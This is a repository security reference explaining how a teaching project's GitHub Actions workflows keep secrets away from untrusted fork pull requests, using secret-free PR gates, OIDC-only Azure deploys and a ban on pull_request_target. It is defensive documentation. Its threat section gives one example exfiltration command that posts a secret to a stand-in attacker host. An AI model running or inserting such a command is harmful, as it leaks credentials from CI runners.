# CI / GitHub Actions security

Deep reference for how CI keeps secrets safe from untrusted pull requests. The
always-on invariants are summarized in `AGENTS.md`; this file has the full
mechanics. Read it before touching `.github/workflows/`, adding a secret to a
workflow, or wiring real infra (Azure Postgres / SCCH) into CI.

## The threat

This is a teaching repo (Teaching-HTL-Leonding) — **anyone can fork it and open a
pull request**, and a PR can change *any* file CI executes: a test, a build step,
a script. So PR code is **untrusted code that runs on our runners**. If a workflow
exposes a secret (an LLM API key, a database credential, the deploy webhook) to a
job that runs PR code, that PR can exfiltrate it — e.g. `curl evil.com -d "$SECRET"`.

The defense is simple to state: **the workflows that run untrusted PR code must
have no secrets in their environment, and the workflows that have secrets must not
run untrusted PR code.**

## How the workflows are split

| Workflow | Trigger | Runs PR (untrusted) code? | Has secrets? |
| --- | --- | --- | --- |
| **`qa.yml`** | `pull_request` to `main`, `workflow_call` | **Yes** | **No** — secret-free |
| **`docs.yml`** | `pull_request` to `main` (teacher-docs paths) | **Yes** | **No** — secret-free |
| **`docker-publish.yml`** | `push` to `main`, `workflow_dispatch` | No | Yes — in `build-and-push` only |
| **`promote.yml`** | `workflow_dispatch`, in the environment `production` | No | **No** — OIDC only |

- **`qa.yml`** is the per-PR quality gate (biome, typecheck, unit + component
  tests, `next build`, Playwright e2e — hermetic + DB-backed `@live-db` — and a
  production **Docker image build**). It runs untrusted fork code, so it is
  **secret-free by construction**: it references no `secrets.*`, sets
  `permissions: contents: read`, and feeds only **test-only dummy values** in its
  `env:` block. Those dummies exist because `auth.ts` — the better-auth instance —
  calls `required()` for the `AZURE_*` vars, `TEACHER_GROUP_ID`, and `AUTH_SECRET`
  at module load (also during `next build`), and its drizzle adapter is
  constructed from `DATABASE_URL` at that same module load, so a placeholder
  connection string is needed too — the pool never actually connects during a
  build. `AUTH_SECRET` only has to *match* between the e2e helpers and the dev
  server — e2e tests mint session cookies directly (rows in the database plus a
  hand-signed cookie value, `docs/testing.md`), so no real Entra round-trip
  happens. There is nothing real in this environment to steal.
  - The `e2e` job runs an **ephemeral `postgres:18` service container** so the
    DB-backed `@live-db` tests run on every PR. This stays secret-free: the
    container's `POSTGRES_PASSWORD` is a **non-secret dummy literal**, the app
    reaches it with throwaway **password auth** (not Entra), and the database is
    discarded with the runner. No `secrets.*`, no real Azure Postgres.
  - The `prod-build` job (PR-only — `if: github.event_name == 'pull_request'`)
    reproduces `docker-publish.yml`'s multi-stage image build so a build break
    surfaces on the PR instead of after merge. It is **also secret-free**: it never
    logs in to a registry and **`push: false`**, so no `DOCKER_*` credentials are
    needed; it only **reads** the layer cache (`cache-from: type=gha`, no cache
    export — write is restricted for fork PR tokens). On a `main` push
    (`workflow_call`) this job is skipped because `docker-publish.yml` does the real
    build+push.
- **`docs.yml`** is the light teacher-guide gate for PRs `qa.yml` skips via its
  `**.md` paths-ignore (docs-only changes under `teacher-docs/`): site unit
  tests, workspace typecheck, `docs:build`. It runs untrusted fork code like
  `qa.yml`, so the same rule applies: **no secrets, no env, `contents: read`** —
  and none are needed, the docs build touches no app code.
- **`docker-publish.yml`** holds the real secrets (`DOCKER_USERNAME` /
  `DOCKER_PASSWORD`, `AZURE_WEBAPP_CI_CD_URL`) — all of them in its
  `build-and-push` job, which is the only place in the repo that references a
  `secrets.*` value at all. It triggers **only** on `push` to `main` (a
  maintainer merge) and manual `workflow_dispatch`. A fork PR cannot produce a
  push to `main`, so it can never reach these secrets. It reuses `qa.yml` via
  `workflow_call` as a gate, then builds/publishes/deploys.
  - The **`deploy-dev`** job hands the same image to the dev stage of the new
    Azure environment (`docs/azure-runtime-env.md`). It is **secret-free**: it
    reaches Azure by OIDC (below) and holds none of the Docker Hub credentials
    above.
- **`promote.yml`** deploys an image version that already sits in the Azure
  registry to the prod stage; it builds nothing and runs no PR code. It is
  **secret-free** for the same reason — OIDC only — and runs in the GitHub
  environment `production`.

## Azure deploys: OIDC federation, no stored credential

**No Azure credential exists in GitHub.** The two Azure deploy jobs
(`docker-publish.yml`'s `deploy-dev` and `promote.yml`) authenticate with a
short-lived OIDC token that GitHub mints for the run and Azure exchanges for an
access token, against a user-assigned identity per stage.

- **`id-token: write` is granted per job**, to those two and to
  `publish-cli.yml`'s npm trusted publishing — nowhere else. A job cannot grant
  itself the permission, and the token is worthless without a matching
  federated subject on the other side.
- **The federated subjects are exact.** The dev identity trusts only
  `repo:<this repo>:ref:refs/heads/main`, the prod identity only
  `repo:<this repo>:environment:production`. A fork PR runs under its own
  repository and a feature branch under its own ref, so **neither produces a
  subject any identity trusts** — the exchange fails before any Azure call.
  `deploy-dev` additionally carries `if: github.ref == 'refs/heads/main'`.
- **The `production` environment is restricted to `main`** (deployment
  branches), which is what makes the prod subject reachable only from `main`.
  That branch restriction is part of the trust chain — **do not loosen it**; a
  required reviewer may be added on top.
- **Client, tenant and subscription ids are plain `vars.*`, not secrets.** They
  are identifiers, not credentials: without a trusted subject they authenticate
  nothing. Which variable lives where is in `docs/azure-runtime-env.md`.
- The rights behind each identity are minimal and stage-bound — the dev one may
  push to the registry and update the dev app, the prod one may only pull and
  update the prod app, so a promotion can never introduce a new image
  (`docs/azure-runtime-env.md`).

## GitHub's built-in protections we rely on

1. **Secrets are withheld from fork `pull_request` runs.** GitHub does not pass
   repository or organization secrets to a workflow triggered by `pull_request`
   from a fork, and the `GITHUB_TOKEN` is read-only there. This is automatic — even
   if `qa.yml` *did* reference a secret, a fork PR run wouldn't receive it. We don't
   rely on that alone (qa.yml references none), but it is the backstop.
2. **`pull_request_target` is banned here.** That trigger runs in the *base* repo
   context **with** secrets; it is only safe while it checks out the base ref. It
   becomes a secret-leak the moment it checks out and runs PR head code. **Do not
   introduce `pull_request_target`** in this repo.
3. **External-contributor approval is required.** In repo/org Settings → Actions →
   General → *Fork pull request workflows*, the setting is
   **"Require approval for all external contributors"** — a maintainer must click
   *Approve and run* before any workflow runs for an outside contributor. This also
   guards runner abuse (crypto-mining, etc.) on the secret-free workflow. This is a
   GitHub UI setting, not in the repo — keep it on.

## Invariants (do not break these)

- **`qa.yml` stays secret-free.** Never add a `secrets.*` reference or a real
  credential to a workflow that runs on `pull_request`. The `env:` block is
  dummies only.
- **No real credentials on a fork `pull_request`.** The live tag is split:
  `@live-db` (needs a Postgres database, no LLM) runs in CI against the **ephemeral
  container** above, and the image lifecycle rides it too — a temporary
  filesystem root, no Azure credentials, no mounted share — safe because both
  are non-secret local resources, not real infra. `@live-llm` (needs the SCCH
  LLM — geo-blocked to Austria + un-containerizable) and `@live-storage` (the
  manual smoke against a REAL mounted Azure Files share, `docs/images.md`;
  everything else image-related is `@live-db`) are both excluded from the PR
  run via `npm run test:e2e:ci` (`--grep-invert "@live-llm|@live-storage"`) and run
  local-only. Tests against **real** Azure Postgres, SCCH, or Azure Files must run
  only on a **trusted trigger** — `push` to `main`, a `schedule`, or a
  reviewer-gated GitHub *Environment* — never on fork PR code.
- **Keep `permissions:` least-privilege.** `qa.yml` only reads code and runs
  tests, so `contents: read`. Any workflow that needs more should request the
  minimum it needs, scoped to the job.
- **No `pull_request_target`.** See protection 2 above.
- **Azure deploys stay credential-free.** Never store an Azure client secret or
  publish profile in GitHub, never widen a federated subject, and never loosen
  the `production` environment's `main`-only deployment branches — that
  restriction is what keeps the prod identity out of reach of every other ref.
